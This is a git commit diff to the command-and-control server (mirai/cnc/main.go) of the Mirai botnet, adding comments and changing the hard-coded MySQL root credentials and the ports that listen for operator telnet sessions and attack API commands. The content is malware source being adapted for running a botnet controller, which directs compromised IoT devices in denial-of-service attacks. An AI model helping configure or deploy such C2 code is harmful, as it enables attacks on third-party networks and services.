3a02e82124be7f0be9bf6bb98ae59381a4e78ec5
randolph <wwk.randolph@gmail.com>
2017-02-22 19:02:40 +0800

    Add some comments

--- mirai/cnc/main.go
+++ mirai/cnc/main.go
@@ -7,22 +7,22 @@ import (
     "time"
 )
 
-const DatabaseAddr string   = "127.0.0.1"
+const DatabaseAddr string   = "127.0.0.1:3306" // port that mysql is listening on
 const DatabaseUser string   = "root"
-const DatabasePass string   = "password"
+const DatabasePass string   = "root"
 const DatabaseTable string  = "mirai"
 
 var clientList *ClientList = NewClientList()
 var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)
 
 func main() {
-    tel, err := net.Listen("tcp", "0.0.0.0:23")
+    tel, err := net.Listen("tcp", "0.0.0.0:6024") // port that will listen for telnet
     if err != nil {
         fmt.Println(err)
         return
     }
 
-    api, err := net.Listen("tcp", "0.0.0.0:101")
+    api, err := net.Listen("tcp", "0.0.0.0:6025") // port that will listen for api command
     if err != nil {
         fmt.Println(err)
         return
